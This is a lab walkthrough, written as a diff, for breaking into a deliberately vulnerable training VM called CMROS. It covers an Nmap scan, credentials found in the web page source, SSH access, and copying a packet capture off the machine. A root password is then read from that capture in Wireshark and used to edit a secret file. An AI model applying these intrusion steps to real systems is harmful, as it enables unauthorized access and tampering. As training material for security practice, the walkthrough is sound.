@@ -1,0 +1,54 @@
+•	CMROS virtual machine (CMROS.zip)
+•	CMROS IP address
+•	cap.pcapng packet-capture file
+Procedure:-
+1.	Step1:- Start the CMROS virtual machine and note its IP address.
+192.168.71.129
+2.	 Start Kali Linux and use Nmap tool to scan the target system to identify available services.
+•	80 –port, service-http
+•	13652 –port, service-ssh 
+ 
+3.	Access the CMROS web application enter Cmros IP address in browser and inspect the source code for exposed information.
+Username:test
+Password:test
+4.	 Use the discovered credentials to access the target system.enter below command in kali terminal.
+ssh test@192.168.71.129 -p 13652
+yes
+password: test
+5.	Enumerate users and files available on the system. 
+test@vulnOs: 
+ls
+cd desktop
+ls
+sudo cat cap.pcapng
+sudo cat s3cr3t.txt
+password:test
+you are getting incorrect password
+
+6.	Use WinSCP to transfer the packet capture file from the target system.
+File protocol:SCP
+Host name:CMROS IP Address(192.168.71.129)
+Port number:13652
+User name:test
+Password:test
+
+LoginàAcceptàContinue
+file cap.pcapng  Copy and paste in kali desktop 
+7.	Analyze the packet capture file using Wireshark.
+Desktopàcap.pcapngàopen
+Right click on TCP Follow TCP streams to observe transmitted credentials and network communication.
+User:- root
+Password:-5gr3ss9hvvc68mT66
+8.	Access the root account, examine the available files, and perform modifications on the target system. 
+ls
+cd ..
+ls
+cd home
+ls
+cd test
+ls
+cd Desktop
+ls
+cat s3cr3t.txt
+nano s3cr3t.txt
+Successfully Done Analyze and Exploit the target root system of VulnerableOS. 
